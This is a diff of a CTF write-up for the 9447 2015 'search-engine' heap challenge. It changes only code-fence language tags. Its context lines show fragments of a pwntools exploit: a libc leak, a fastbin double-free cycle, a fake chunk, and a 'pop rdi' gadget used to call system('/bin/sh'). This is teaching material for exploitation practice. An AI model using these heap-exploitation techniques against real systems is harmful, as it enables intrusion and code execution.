@@ -16,12 +16,12 @@ I'll be using a 64-bit Ubuntu 14.04 VM, specifically the one [here](https://gith
 ## Reversing the binary
 
 We first run `file` and `checksec` before jumping into reversing the binary:
-```
+```console
 $ file search-bf61fbb8fa7212c814b2607a81a84adf
 search-bf61fbb8fa7212c814b2607a81a84adf: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
 ```
 
-```
+```console
 $ checksec search-bf61fbb8fa7212c814b2607a81a84adf
 [*] '/vagrant/ctf/9447-2015/search-engine/search-bf61fbb8fa7212c814b2607a81a84adf'
     Arch:     amd64-64-little
@@ -36,7 +36,7 @@ So we're working with a 64-bit, dynamically linked, stripped binary, which has N
 
 The binary is a program for indexing sentences and then searching for words in those sentences. Here's some example output:
 
-```
+```console
 $ ./search-bf61fbb8fa7212c814b2607a81a84adf
 1: Search with a word
 2: Index a sentence
@@ -161,7 +161,7 @@ You can comment in the `gdb.attach` section when you want to attach `gdb` to the
 
 Running the script gives:
 
-``` python
+``` console
 $ ./solve.py
 [+] Starting local process './search-bf61fbb8fa7212c814b2607a81a84adf': Done
 [*] Switching to interactive mode
@@ -175,7 +175,7 @@ So no leak. This isn't surprising considering the code isn't storing any data in
 
 Let's try sending the same string again:
 
-```
+``` console
 $ ./solve.py
 [+] Starting local process './search-bf61fbb8fa7212c814b2607a81a84adf': Done
 [*] Switching to interactive mode
@@ -218,7 +218,7 @@ Using that information, we come up with the following plan:
 6. When we search for that `Word` node, when we get a match the `sentence` will be printed, which will leak memory.
 
 This is implemented in the following function, which is commented with some of the details.
-```
+``` python
 def leak_libc():
     # this sentence is the same size as a list node
     index_sentence(('a'*12 + ' b ').ljust(40, 'c'))
@@ -286,7 +286,7 @@ For our first attempt, let's create two sentences: `'a'*54 + ' d'` (let's call t
 
 We can easily fix this problem by allocating three strings of length 56 instead of two. Following the same steps as above, we would start off with a fastbin list like `sentence_a_addr -> sentence_b_addr -> sentence_c_addr -> NULL`, and then after searching for '\x00' we would match on `sentence_b`, and the free list would look like: `sentence_b_addr -> sentence_a_addr -> sentence_b_addr -> ...`. We've created our double free cycle! We will also match on `sentence_a` in this case, but we'll choose not to delete it. Here's the code:
 
-``` c
+``` python
 def index_sentence(s):
     p.sendline('2')
     p.sendline(str(len(s)))
@@ -313,7 +313,7 @@ def make_cycle():
 
 Now that we have our double free, what can we do with it? We can first allocate a new sentence of size 56, and we'd get back the `sentence_b` chunk. We'd put a fake heap chunk (in particular a fake `fwd` pointer) in this sentence, and since this heap chunk is still in the free list (because we created that cycle), we can thus control the next chunk in the free list! We can make the fake chunk with the function below:
 
-``` c
+``` python
 def make_fake_chunk(addr):
     # set the fwd pointer of the chunk to the address we want
     fake_chunk = p64(addr)
@@ -324,7 +324,7 @@ The next question is what address we pass to it. We can't just make our fake chu
 
 At this point I decided to just dump the stack and see if there was already a 0x40 I could use on it. After running `telescope $rsp 20` in pwndbg, I saw a bunch of code segment addresses that started with the byte 0x40 very close to the return address of the function. We could thus use this as the size of our fake heap chunk. We use ROPGadget to find a `pop rdi; ret` gadget at 0x400e23, and we use that with the address of '/bin/sh' and `system` in the libc (calculated with the libc leak) to spawn a shell. The code for this is below, and you can find the full exploit at the bottom of this post.
 
-``` c
+``` python
 pop_rdi_ret = 0x400e23
 
 def allocate_fake_chunk(binsh_addr, system_addr):
@@ -348,7 +348,7 @@ I added a few commands to [pwndbg](https://github.com/pwndbg/pwndbg) a while ago
 
 One neat trick I used was based on something I saw in a [livestream](https://www.youtube.com/watch?v=AKs277vpVSY) by Gynvael, captain of Dragon Sector. Essentially instead of breaking on every `malloc` and `free` and inspecting memory/registers or using the `bins` or `heap` commands to see what's getting allocated, we can simply print out that information as it happens. Put the following code in `helper.py`:
 
-```
+``` python
 import gdb
 
 last_size = None
@@ -427,7 +427,7 @@ end
 ```
 
 The output after indexing the sentence 'a b' and 'c d' looks like:
-```
+```console
 pwndbg> plist 0x006030e0
 $1 = {
   word_ptr = 0x603092 "d",
@@ -488,7 +488,7 @@ end
 
 The full exploit is provided below. Remember that you'll need to change the offsets for a different libc. You also may need to run it a few times because the stack leak occassionally fails, as mentioned above.
 
-``` c
+``` python
 #!/usr/bin/env python2
 
 from pwn import *
